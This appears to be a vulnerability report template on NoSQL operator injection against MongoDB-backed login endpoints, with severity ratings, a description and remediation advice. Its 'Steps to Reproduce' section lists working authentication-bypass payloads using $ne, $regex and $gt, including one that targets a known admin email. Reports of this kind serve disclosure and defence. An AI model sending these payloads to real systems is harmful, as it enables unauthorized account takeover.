# NoSQL Injection - Operator-based Authentication Bypass

**Title:** NoSQL Operator Injection for Authentication Bypass

**Severity:** High

**Impact:** High

**Exploitability:** High

**CVSS Base Score:** 8.1

**CVSS v3 Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

**Vulnerability Type:** NoSQL Injection

**Target:** Login or authentication endpoints using MongoDB backend

## Impact

Allows attackers to bypass authentication entirely and access any account, leading to unauthorized data access and account takeover.

## Description

User input is passed unsafely into MongoDB queries, allowing operators like $ne, $gt, $regex to alter the query logic and match unintended documents.

## Steps to Reproduce

Common patterns (sent as form data or JSON):

email[$ne]=test@test.com&password[$ne]=test

email[$regex]=.*&email[$regex]=.*

email=admin@example.com&password[$ne]=x

email[$gt]=&password[$gt]=

When email is known:

email=admin%40example.com&password[$ne]=x

## Recommendation

Use parameterized queries or safe query builders from the ORM/driver. Never allow user input to directly control query operators. Validate and whitelist expected fields and operators. Use least privilege database accounts.

## References

PortSwigger NoSQL injection resources and MongoDB operator documentation.